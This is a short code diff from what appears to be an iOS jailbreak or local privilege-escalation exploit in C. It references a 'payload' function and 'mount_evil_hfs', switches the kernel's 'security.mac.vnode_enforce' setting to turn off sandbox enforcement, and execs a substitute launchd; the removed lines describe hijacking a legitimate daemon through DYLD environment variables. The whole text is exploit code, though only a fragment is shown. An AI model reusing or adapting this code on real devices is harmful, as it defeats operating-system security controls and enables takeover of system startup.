@@ -211,18 +211,14 @@ __attribute__ ((naked)) void payload() {
 
 int one = 1;
 char* execve_env[]= {NULL};
-char* execve_params[]={"/usr/sbin/notifyd", NULL};
+char* execve_params[]={"/sbin/zaunchd", NULL};
 
 int main(int argc, char* argv[]) {
-	//we must do this as fast as possible (yes this sucks but it kinda works)
-	sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
-
 	prepare_vndevice();
 	mount_evil_hfs();
- 
-	//run the legit daemon we just hijacked
-	setenv("DYLD_INSERT_LIBRARIES", "", 1);
-	setenv("DYLD_FORCE_FLAT_NAMESPACE", "", 1);
+
+	//restore vnode_enforce and run launchd
+    sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
 	execve(execve_params[0], execve_params, execve_env);
 }
 
